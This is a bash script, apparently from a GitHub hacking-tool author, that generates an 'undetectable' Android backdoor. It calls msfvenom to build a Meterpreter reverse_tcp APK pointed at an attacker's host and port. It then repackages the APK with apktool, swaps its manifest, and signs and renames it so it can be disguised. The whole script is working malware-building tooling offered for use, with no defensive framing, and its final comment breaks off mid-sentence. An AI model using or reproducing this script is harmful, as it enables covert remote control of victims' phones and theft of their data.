#Author - github.com/kinghacker0
#Credit - Give me credit if you use any part of this code.

clear

C='\033[1;36m'
G='\033[1;32m'
R='\033[1;31m'
Y='\033[1;33m'
B='\033[1;34m'
P='\033[1;35m'

#Banner
echo -e "\e[31m          .                                                      .             \e[1m";
echo -e "\e[31m        .n                   .                 .                  n.           \e[1m";
echo -e "\e[31m      .dP                  dP                   9b                 9b.         \e[1m";
echo -e "\e[31m      qXb         .       dX                     Xb       .        dXp         \e[1m";
echo -e "\e[31m      9XXb      .dXb    __X                       X__    dXb.     dXPXb        \e[1m";
echo -e "\e[31m       XXXXX _.dXXXXb dXXXXX    (Undetectable)   XXXXXb._dXXXXP XXXXXX         \e[1m";
echo -e "\e[31m       9XXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXP         \e[1m";
echo -e "\e[31m        XXXXXXXXXXXXXXXXX'~   ~ OOO8b   d8OOO'~   ~ XXXXXXXXXXXXXXXXX          \e[1m";
echo -e "\e[31m          9XXXXXXP  '9XX'   DIE     98v8P'  HUMAN    XXP'  9XXXXXXX            \e[1m";
echo -e "\e[31m                      9X.          .db|db.          .XP                        \e[1m";
echo -e "\e[31m                        )b.  .dbo.dP' v' 9b.odb.  .dX(                         \e[1m";
echo -e "\e[31m                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.                        \e[1m";
echo -e "\e[31m                     dXXXXXXXXXXXP'   .    9XXXXXXXXXXXb                       \e[1m";
echo -e "\e[31m                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb                      \e[1m";
echo -e "\e[31m                    9XXb'    XXXXXb.dX|Xb.dXXXXX'    dXXP                      \e[1m";
echo -e "\e[31m                      '      9XXXXXX(   )XXXXXXP       '                       \e[1m";
echo -e $C"                           [Code By : kinghacker0]                                  " 
echo -e   "                                Version - 2.0                                        "
#Payload Generate
echo -e $G"                        "
read -p "[*] Enter name of payload#~: " backdoor
read -p "[*] Enter lhost#~: " lhost
read -p "[*] Enter lport#~: " lport
msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> backdoor.apk
#Decompiling
echo -e $R"[-] Genereting Undetectable Backdoor"
apktool d backdoor.apk
rm backdoor.apk && cd backdoor
rm AndroidManifest.xml && cd ..
cp AndroidManifest.xml backdoor

#Recompiling
apktool b backdoor
cd backdoor && cd dist
mv backdoor.apk ..
cd .. && mv backdoor.apk ..
cd .. && rm -rf backdoor

#Signing the apk
echo -e "\e[96m                                 \e[2m"
apksigner -p kinghacker0 keystore backdoor.apk final.apk
rm backdoor.apk
mv final.apk $backdoor.apk

echo
echo -e $Y"I Recommend You To Sign It With Apk-Editor Apk"

#Changing this banner doesn't make you
